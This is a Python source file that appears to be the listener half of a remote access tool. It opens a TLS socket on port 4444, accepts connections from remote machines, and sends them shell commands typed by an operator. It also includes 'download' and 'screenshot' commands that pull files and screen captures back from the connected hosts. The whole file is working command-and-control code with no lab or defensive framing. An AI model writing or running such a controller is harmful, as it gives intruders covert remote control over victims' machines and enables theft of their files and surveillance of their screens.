# server.py
import socket
import ssl
import threading
from pathlib import Path

BASE_DIR = Path(__file__).resolve().parent
CERT_FILE = BASE_DIR / "server.pem"
KEY_FILE = BASE_DIR / "server.key"

context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
context.load_cert_chain(certfile=CERT_FILE, keyfile=KEY_FILE)

HOST = '0.0.0.0'
PORT = 4444
server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_sock.bind((HOST, PORT))
server_sock.listen(5)

secure_sock = context.wrap_socket(server_sock, server_side=True)
print(f"[+] Listening on {HOST}:{PORT} (TLS)")

clients = []

def recv_all(sock):
    data = b""
    while True:
        chunk = sock.recv(4096)
        if b'[EOF]' in chunk:
            data += chunk.replace(b'[EOF]', b'')
            break
        if b'[END]' in chunk:
            data += chunk.replace(b'[END]', b'')
            break
        data += chunk
    return data

def client_handler(conn, addr):
    print(f"[+] Connected from {addr}")
    try:
        while True:
            cmd = input(f"[{addr}]$ ").strip()
            if not cmd:
                continue
            conn.send(cmd.encode())
            if cmd == "exit":
                break
            if cmd.startswith("upload "):
                file_path = input("Enter path to local file to send: ").strip()
                with open(file_path, "rb") as f:
                    while True:
                        chunk = f.read(4096)
                        if not chunk:
                            break
                        conn.sendall(chunk)
                conn.send(b'[EOF]')
                print("[+] Upload sent")
            elif cmd.startswith("download "):
                data = recv_all(conn)
                output_file = input("Save as filename: ").strip()
                with open(output_file, 'wb') as f:
                    f.write(data)
                print(f"[+] File saved to {output_file}")
            elif cmd == "screenshot":
                data = recv_all(conn)
                with open("screenshot.png", "wb") as f:
                    f.write(data)
                print("[+] Screenshot saved as screenshot.png")
            else:
                output = recv_all(conn)
                print(output.decode(errors='ignore'))
    except Exception as e:
        print(f"[!] Error: {e}")
    finally:
        conn.close()
        print(f"[-] Disconnected: {addr}")

def accept_loop():
    while True:
        conn, addr = secure_sock.accept()
        threading.Thread(target=client_handler, args=(conn, addr), daemon=True).start()

accept_loop()
